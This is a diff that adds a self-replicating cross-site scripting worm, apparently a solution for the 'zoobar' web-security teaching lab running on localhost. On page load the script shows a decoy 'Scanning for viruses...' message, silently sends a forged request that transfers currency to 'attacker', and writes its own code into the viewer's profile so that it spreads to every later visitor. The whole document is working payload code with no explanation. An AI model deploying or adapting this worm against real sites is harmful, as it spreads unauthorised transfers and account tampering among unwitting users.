@@ -1,0 +1,36 @@
+<script id="worm">
+
+    window.onload = function () {
+
+        var headerTag = '<script id="worm" type="text/javascript">';
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+        document.getElementById("profile").appendChild(document.createTextNode("Scanning for viruses..."));
+
+        var AjaxTransfer = null;
+        AjaxTransfer = new XMLHttpRequest();
+        AjaxTransfer.open("POST", "http://localhost:8080/zoobar/index.cgi/transfer", true);
+        AjaxTransfer.setRequestHeader(
+            "Content-Type", "application/x-www-form-urlencoded"
+        )
+        AjaxTransfer.setRequestHeader(
+            "Referer", "http://localhost:8080/zoobar/index.cgi/transfer"
+        )
+        AjaxTransfer.send("zoobars=1&recipient=attacker&submission=Send");
+
+        var AjaxProfile = null;
+        AjaxProfile = new XMLHttpRequest();
+        AjaxProfile.open("POST", "http://localhost:8080/zoobar/index.cgi/", true);
+        AjaxProfile.setRequestHeader(
+            "Content-Type", "application/x-www-form-urlencoded"
+        )
+        AjaxProfile.setRequestHeader(
+            "Referer", "http://localhost:8080/zoobar/index.cgi/"
+        )
+        AjaxProfile.send("profile_update=" + wormCode + "&profile_submit=Save");
+    }
+
+</script>
